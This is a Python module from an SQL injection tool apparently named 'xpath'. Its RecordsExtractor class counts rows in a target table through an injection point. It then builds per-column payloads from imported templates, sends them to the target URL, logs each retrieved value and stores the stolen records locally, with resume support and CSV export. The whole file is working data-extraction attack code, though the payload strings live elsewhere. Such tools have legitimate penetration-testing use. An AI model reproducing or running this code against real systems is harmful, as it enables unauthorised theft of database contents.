#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from xpath.common.session import session
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.lib import compat_urlencode, re, collections, TBL_RECS
from xpath.common.payloads import PAYLOADS_RECS_COUNT, PAYLOADS_RECS_DUMP
from xpath.common.utils import (
    prettifier,
    prepare_payload_request,
    clean_up_payload,
    clean_up_offset_payload,
)


class RecordsExtractor(object):
    """
    Extracts entries from tables...
    """

    def _clean_up_cols(self, columns):
        return re.sub(" +", "", columns).split(",")

    def _generate_data_payloads(self, data_count, payload, cols=[], index=0):
        payload = clean_up_offset_payload(payload)
        payloads = {}
        for i in range(index, data_count):
            payloads.update({i: []})
            for c in cols:
                payloads[i].append(
                    {
                        "column": c,
                        "payload": payload.format(col=c, index=i),
                    }
                )
        return payloads

    def _data_count(self, db="", tbl=""):
        _temp = []
        if db and tbl:
            count_payloads = []
            [count_payloads.extend(v) for _, v in PAYLOADS_RECS_COUNT.items()]
            if self._dbms:
                count_payloads = PAYLOADS_RECS_COUNT.get(self._dbms, count_payloads)
            for i in count_payloads:
                data = i.format(db=db, tbl=tbl)
                _temp.append(data)
        payloads = self._generat_payload(payloads_list=_temp)
        return self._extact(payloads=payloads)

    def __generate_records_tables(self, tbl, cols, count):
        table_name = f"{count}_{tbl}_data"
        tmp_table_name = f"{count}_{tbl}_tmp"
        query = TBL_RECS.format(name=f"{tmp_table_name}", tbl_name=f"{tmp_table_name}")
        ok = session.drop_table(
            session_filepath=self.session_filepath,
            table_name=table_name,
            columns=cols,
            query=query,
            auto_create=True,
            exec_query=True,
        )
        return ok

    def data_dump(self, db="", tbl="", cols=""):
        index = 0
        _temp = []
        is_resumed = False
        fetched_data = {}
        _temp_payloads = []
        fetched_records = []
        cols = self._clean_up_cols(cols)
        count = "{0:03d}".format(len(cols))
        RecordsResponse = collections.namedtuple(
            "RecordsResponse",
            ["fetched", "count", "database", "table", "columns", "records"],
        )
        if db and tbl and cols and isinstance(cols, list):
            dump_payloads = []
            [dump_payloads.extend(v) for _, v in PAYLOADS_RECS_DUMP.items()]
            test_column = "0x72306f746833783439"
            if self._dbms:
                dump_payloads = PAYLOADS_RECS_DUMP.get(self._dbms, dump_payloads)
                test_column = "1337"
            for i in dump_payloads:
                data = i.format(col=test_column, db=db, tbl=tbl)
                _temp_payloads.append(data)

        try:
            tmp_table_name = f"{count}_{tbl.strip()}_tmp"
            fetched_data = session.fetch_from_table(
                session_filepath=self.session_filepath,
                table_name=tmp_table_name,
                group_by_columns="`index`,`column_name`,`column_value`",
                cursor=False,
            )
            if fetched_data:
                is_resumed = True
        except Exception as error:
            pass
        logger.info(
            "fetching column(s) '%s' for table '%s' in database: '%s'"
            % (", ".join(cols), tbl, db)
        )
        last_seen = 0
        remainder = 0
        retval = self._data_count(db=db, tbl=tbl)
        if retval.is_injected:
            data_count = int(retval.result)
            if data_count != 0:
                logger.info("used SQL query returns %d entries" % (data_count))
            if data_count == 0:
                logger.warning(
                    "used SQL query returns %d entries of columns '%s' for table '%s' in database '%s'"
                    % (data_count, ", ".join(cols), tbl, db)
                )
                return RecordsResponse(
                    fetched=False,
                    count=data_count,
                    database=db,
                    table=tbl,
                    columns=cols,
                    records=[],
                )
            if is_resumed:
                _temp = fetched_data
                for entry in fetched_data:
                    last_seen = index = entry.get("index")
                    value = entry.get("column_value")
                    # logger.info(f"resumed: '{value}'")
                    fetched_records.append(value)
            remainder = len(fetched_data) % len(cols)
            if remainder > 0:
                index -= 1
                last_seen = last_seen - 1
                fetched_records = fetched_records[-remainder:]
            should_fetch = True
            if is_resumed:
                if index == data_count:
                    should_fetch = False
            if should_fetch:
                # logger.info(f"resumed fetching from '{index+1}' record..")
                payloads = self._generat_payload(payloads_list=_temp_payloads)
                retval = self._extact(payloads=payloads)
                if retval.is_injected:
                    payload = clean_up_payload(
                        payload=retval.payload, replace_with="{col}"
                    )
                    payloads = self._generate_data_payloads(
                        data_count=data_count, payload=payload, cols=cols, index=index
                    )
                    if is_resumed and remainder > 0:
                        remaing_records = payloads[last_seen][remainder:]
                        payloads.update({last_seen: remaing_records})
                    if not is_resumed:
                        self.__generate_records_tables(tbl=tbl, cols=cols, count=count)
                    response_data = self._extract_data(
                        payloads=payloads,
                        table=tbl,
                        columns=cols,
                        fetched_records=fetched_records,
                        count=count,
                    )
                    if response_data.is_fetched:
                        _temp.extend(response_data.result)
                    table_name = f"{count}_{tbl}_data"
                    self._pprint_records(
                        field_names=", ".join(cols),
                        database=db,
                        table_name=table_name,
                        table=tbl,
                        columns=cols,
                    )
                    return RecordsResponse(
                        fetched=True,
                        count=data_count,
                        database=db,
                        table=tbl,
                        columns=cols,
                        records=_temp,
                    )
                if not retval.is_injected:
                    status_code = retval.status_code
                    error = retval.error
                    count = retval.payloads_count
                    if status_code not in [200, 0]:
                        message = f"{error} - {count} times"
                        logger.warning(
                            f"HTTP error codes detected during run:\n{message}"
                        )
                    else:
                        message = f"tested with '{count}' queries, unable to find working SQL query."
                        logger.critical(message)
            else:
                table_name = f"{count}_{tbl}_data"
                self._pprint_records(
                    field_names=", ".join(cols),
                    database=db,
                    table_name=table_name,
                    table=tbl,
                    columns=cols,
                )
                return RecordsResponse(
                    fetched=True,
                    count=data_count,
                    database=db,
                    table=tbl,
                    columns=cols,
                    records=_temp,
                )
        if not retval.is_injected:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                message = f"{error} - {count} times"
                logger.warning(f"HTTP error codes detected during run:\n{message}")
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)
        return RecordsResponse(
            fetched=False,
            count=0,
            database=None,
            table=None,
            columns=None,
            records=None,
        )

    def _pprint_records(
        self, field_names, database="", table_name="", table="", columns=None
    ):
        group_by_columns = ""
        if columns:
            group_by_columns = ",".join([f"`{i.strip()}`" for i in columns])
        cursor_or_list = session.fetch_from_table(
            session_filepath=self.session_filepath,
            table_name=table_name,
            group_by_columns=group_by_columns,
        )
        # this time get the cursor to dump data into csv file..
        ok = session.dump_to_csv(
            cursor=cursor_or_list,
            filepath=self.session_filepath,
            database=database,
            table=table,
        )
        cursor_or_list = session.fetch_from_table(
            session_filepath=self.session_filepath,
            table_name=table_name,
            group_by_columns=group_by_columns,
        )
        obj = prettifier(cursor_or_list, field_names, header=True)
        data = obj.data
        entries = obj.entries
        logger.success(f"Database: {database}")
        logger.success(f"Table: {table}")
        logger.success(f"[{entries} entries]")
        logger.success(f"{data}")

    def _save_records(
        self,
        table=None,
        column_names=None,
        records=None,
        count=None,
        clean_insert=False,
    ):
        table_name = f"{count}_{table}_data"
        if table_name and column_names and records:
            session.save(
                session_filepath=self.session_filepath,
                table_name=table_name,
                columns=column_names,
                records=records,
                clean_insert=clean_insert,
            )
        return "done"

    def _extract_data(
        self, payloads, table=None, columns=None, fetched_records=None, count=None
    ):
        _temp, is_interrupted = [], False
        Response = collections.namedtuple("Response", ["is_fetched", "result"])

        for index, values in payloads.items():
            __temp = [] if not fetched_records else fetched_records
            position = 0
            while position < len(values):
                p = values[position]
                name = p.get("column")
                payload = p.get("payload")
                payload_request = prepare_payload_request(self, payload)
                url = payload_request.url
                data = payload_request.data
                regex = payload_request.regex
                headers = payload_request.headers
                try:
                    response = request.inject_payload(
                        url=url,
                        regex=regex,
                        data=data,
                        headers=headers,
                        proxy=self._proxy,
                    )
                except KeyboardInterrupt:
                    logger.warning(
                        "user aborted during enumeration. Xpath will display partial output"
                    )
                    is_interrupted = True
                    break
                else:
                    if response.ok:
                        result = response.result
                        logger.info(
                            "retrieved: '%s'"
                            % (result if result != "<blank_value>" else "")
                        )
                        _temp.append(
                            {
                                "index": index + 1,
                                "column_name": name,
                                "column_value": result,
                            }
                        )
                        __temp.append(result)
                        table_name = f"{count}_{table}_tmp"
                        PREPARED_STATEMENT = f"INSERT INTO `{table_name}` (`index`, `column_name`, `column_value`) VALUES (?, ?, ?);"
                        retval = session.dump(
                            session_filepath=self.session_filepath,
                            query=PREPARED_STATEMENT,
                            values=(index + 1, name, result),
                        )
                    position += 1

            _ = self._save_records(
                table=table, column_names=columns, records=__temp, count=count
            )
            if is_interrupted:
                break

        if _temp and len(_temp) > 0:
            resp = Response(is_fetched=True, result=_temp)
        else:
            resp = Response(is_fetched=False, result=_temp)
        return resp
